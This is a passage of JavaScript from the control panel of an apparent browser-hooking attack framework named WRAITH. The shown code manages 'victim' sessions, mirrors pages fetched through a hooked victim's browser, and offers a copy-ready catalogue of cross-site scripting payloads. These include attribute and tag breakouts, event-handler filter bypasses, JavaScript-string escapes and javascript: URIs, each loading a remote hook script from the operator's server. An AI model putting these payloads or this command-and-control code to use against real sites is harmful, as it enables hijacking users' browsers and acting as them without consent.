      '})();</scr' + 'ipt>';
    var inject = base + s;
    if (/<head[^>]*>/i.test(html)) return html.replace(/<head[^>]*>/i, function (mm) { return mm + inject; });
    if (/<html[^>]*>/i.test(html)) return html.replace(/<html[^>]*>/i, function (mm) { return mm + '<head>' + inject + '</head>'; });
    return inject + html;
  }

  function renderMirror() {
    if (!mirrorVictim || !mmModal) return;
    var id = mirrorVictim;
    var m = state.mirror[id] || (state.mirror[id] = { fetched: [], idx: 0, loading: false });
    var list = mirrorList(id);
    if (m.idx > list.length - 1) m.idx = list.length - 1;
    if (m.idx < 0) m.idx = 0;
    var page = list[m.idx];
    var v = vget(id), online = !!(v && v.online);

    $('mmVid').textContent = id;
    var st = $('mmStatus'); st.textContent = online ? 'online' : 'offline'; st.className = 'mm-status' + (online ? ' on' : '');
    $('mmLive').disabled = !online;
    $('mmBack').disabled = m.idx <= 0;
    $('mmCount').textContent = list.length ? (m.idx + 1) + ' / ' + list.length : '0';
    $('mmUrl').textContent = page ? (page.finalUrl || page.url || '') : '';

    var ov = $('mmOverlay');
    if (m.loading) { ov.hidden = false; ov.textContent = 'fetching through victim…'; }
    else if (!list.length) { ov.hidden = false; ov.textContent = online ? 'No page yet — click ⟳ live to grab the current page.' : 'No stored page for this offline session.'; }
    else if (page && page.error) { ov.hidden = false; ov.textContent = 'fetch failed: ' + page.error + ' (cross-origin reads are blocked by the Same-Origin Policy)'; }
    else ov.hidden = true;

    mmFrame.srcdoc = (page && page.html && !page.error) ? mirrorDoc(page) : '';
  }

  function mirrorReq(type, extra) {
    if (!mirrorVictim) return;
    var v = vget(mirrorVictim);
    if (!v || !v.online) return;                 // fetches only work through a live hook
    var msg = { type: type, victimId: mirrorVictim, reqId: 'm' + Date.now() + Math.floor(Math.random() * 1000) };
    if (extra) for (var k in extra) msg[k] = extra[k];
    state.mirror[mirrorVictim].loading = true;
    renderMirror();
    sendCmd(msg);
  }

  function onMirrorPage(m) {
    var mir = state.mirror[m.victimId] = state.mirror[m.victimId] || { fetched: [], idx: 0, loading: false };
    mir.fetched.push({ url: m.url, finalUrl: m.finalUrl, html: m.html, status: m.status, error: m.error, at: m.at, live: m.live });
    logLine('cmd', '[' + m.victimId + '] mirror: ' + (m.error ? ('error — ' + m.url) : (m.finalUrl || m.url)));
    if (mirrorVictim === m.victimId) {
      mir.loading = false;
      mir.idx = mirrorList(m.victimId).length - 1;   // jump to the page we just got
      renderMirror();
    }
  }

  (function mirrorInit() {
    mmModal = $('mirrorModal'); mmFrame = $('mmFrame');
    if (!mmModal) return;
    $('mmClose').onclick = closeMirror;
    $('mmLive').onclick = function () { mirrorReq('mirror-dom'); };
    $('mmBack').onclick = function () {
      if (!mirrorVictim) return;
      var m = state.mirror[mirrorVictim]; if (m && m.idx > 0) { m.idx--; renderMirror(); }
    };
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && !mmModal.hidden) closeMirror(); });
    window.addEventListener('message', function (e) {
      if (!mmFrame || e.source !== mmFrame.contentWindow) return;   // only our mirror iframe
      var d = e.data;
      if (d && d.from === 'wraith-mirror' && d.href) mirrorReq('mirror-fetch', { url: d.href });
    });
  })();

  // ---- payloads tab (XSS-Hunter-style injection catalog) ----------------
  (function payloadsTab() {
    // The hook loads as a real <script> element in every payload below, which is
    // what lets WRAITH's hook.js derive its own C2 origin (document.currentScript)
    // — so the callback URL is always correct regardless of where it fires.
    var hookUrl = location.origin + '/hook.js';
    var LOADER = "with(document)body.appendChild(createElement('script')).src='__HOOK__'";

    var CATS = [
      { name: 'HTML context — break out & inject <script>',
        note: 'Your input renders as HTML. Break the current tag/attribute, then pull the hook.',
        items: [
          ['Attribute breakout (double quote)', '"><script src="__HOOK__"></script>'],
          ['Attribute breakout (single quote)', '\'><script src="__HOOK__"></script>'],
          ['Raw HTML sink (no breakout needed)', '<script src="__HOOK__"></script>'],
          ['Inside an existing <script> block', '</script><script src="__HOOK__"></script>']
        ] },
      { name: 'Tag-close contexts',
        note: 'Your input lands inside a text-only element; close it first.',
        items: [
          ['<textarea>', '</textarea><script src="__HOOK__"></script>'],
          ['<title>', '</title><script src="__HOOK__"></script>'],
          ['<style>', '</style><script src="__HOOK__"></script>'],
          ['<noscript>', '</noscript><script src="__HOOK__"></script>'],
          ['HTML comment', '--><script src="__HOOK__"></script>']
        ] },
      { name: 'Event handlers — no <script> tag (filter bypass)',
        note: 'For when <script> is stripped. Each injects the hook as a real script element.',
        items: [
          ['img onerror', '"><img src=x onerror="' + LOADER + '">'],
          ['svg onload', '"><svg onload="' + LOADER + '">'],
          ['input autofocus', '"><input autofocus onfocus="' + LOADER + '">'],
          ['details ontoggle', '"><details open ontoggle="' + LOADER + '">'],
          ['body onload', '"><body onload="' + LOADER + '">'],
          ['video/source onerror', '"><video><source onerror="' + LOADER + '">'],
          ['iframe srcdoc', '"><iframe srcdoc="&lt;script src=__HOOK__&gt;&lt;/script&gt;">'],
          ['marquee onstart (legacy)', '"><marquee onstart="' + LOADER + '">']
        ] },
      { name: 'JavaScript context',
        note: 'Your input is already inside a <script> / JS string. Break the string, then inject.',
        items: [
          ['Break single-quoted string', "';" + LOADER + ";//"],
          ['Break double-quoted string', '";' + LOADER + ';//'],
          ['Bare expression (no quotes)', LOADER]
        ] },
      { name: 'URL / attribute sink (javascript:)',
        note: 'For href/src sinks that accept a javascript: URI.',
        items: [
          ['javascript: URI', 'javascript:' + LOADER]
        ] },
      { name: 'jQuery present',
        note: 'If the page ships jQuery, load the hook via getScript.',
        items: [
          ['$.getScript', '"><script>$.getScript(\'__HOOK__\')</script>']
        ] },
      { name: 'Bare hook',
        note: 'Embed directly in a page you control, or any raw-HTML sink.',
        items: [
          ['Script include', '<script src="__HOOK__"></script>']
        ] }
    ];

    var body = $('payloadsBody');
    var consoleView = $('consoleView'), payloadsView = $('payloadsView');
    var tabs = [].slice.call(document.querySelectorAll('.vtab'));
    if (!body || !payloadsView || !tabs.length) return;

    function fill(tpl) { return tpl.split('__HOOK__').join(hookUrl); }

    function copyText(t, btn) {
      function done() {
        var o = btn.textContent; btn.textContent = 'copied'; btn.classList.add('ok');
        setTimeout(function () { btn.textContent = o; btn.classList.remove('ok'); }, 1100);
      }
      // navigator.clipboard needs a secure context; the VPS runs plain HTTP, so
      // fall back to execCommand there.
      function fb() {
        var ta = document.createElement('textarea');
        ta.value = t; ta.style.position = 'fixed'; ta.style.top = '-9999px'; ta.style.opacity = '0';
        document.body.appendChild(ta); ta.focus(); ta.select();
        try { document.execCommand('copy'); done(); } catch (e) {}
        ta.remove();
      }
      if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(t).then(done, fb);
      else fb();
    }

    function renderList() {
      var list = $('payloadList'); if (!list) return;
      list.innerHTML = CATS.map(function (cat) {
        var rows = cat.items.map(function (it) {
          return '<div class="pl-row">' +
            '<div class="pl-label">' + esc(it[0]) + '</div>' +
            '<div class="pl-codewrap">' +
              '<code class="pl-code">' + esc(fill(it[1])) + '</code>' +
              '<button class="pl-copy" type="button">copy</button>' +
            '</div></div>';
        }).join('');
        return '<div class="pl-cat"><div class="pl-cat-h">' + esc(cat.name) + '</div>' +
          (cat.note ? '<div class="pl-cat-note">' + esc(cat.note) + '</div>' : '') + rows + '</div>';
      }).join('');
      [].forEach.call(list.querySelectorAll('.pl-row'), function (row) {
        var code = row.querySelector('.pl-code'), btn = row.querySelector('.pl-copy');
        btn.onclick = function () { copyText(code.textContent, btn); };
      });
    }

    function render() {
      body.innerHTML =
        '<div class="pl-top">' +
          '<label class="pl-hooklab">Hook URL' +
            '<input id="plHook" class="pl-hookin" spellcheck="false" value="' + esc(hookUrl) + '"/></label>' +
          '<div class="pl-warn">Served over <b>HTTP</b> on this deployment. Browsers block HTTP scripts on ' +
            'HTTPS pages (mixed content), so for an HTTPS target front WRAITH with TLS. HTTP targets work as-is.</div>' +
        '</div>' +
        '<div id="payloadList" class="pl-list"></div>';
      var inp = $('plHook');
      inp.oninput = function () { hookUrl = inp.value.trim() || (location.origin + '/hook.js'); renderList(); };
      renderList();
    }

    function show(view) {
      var toPayloads = view === 'payloads';
      payloadsView.hidden = !toPayloads;
      consoleView.hidden = toPayloads;
      tabs.forEach(function (t) { t.classList.toggle('active', t.getAttribute('data-view') === view); });
    }
    tabs.forEach(function (t) { t.onclick = function () { show(t.getAttribute('data-view')); }; });

    render();
  })();

  connect();
})();
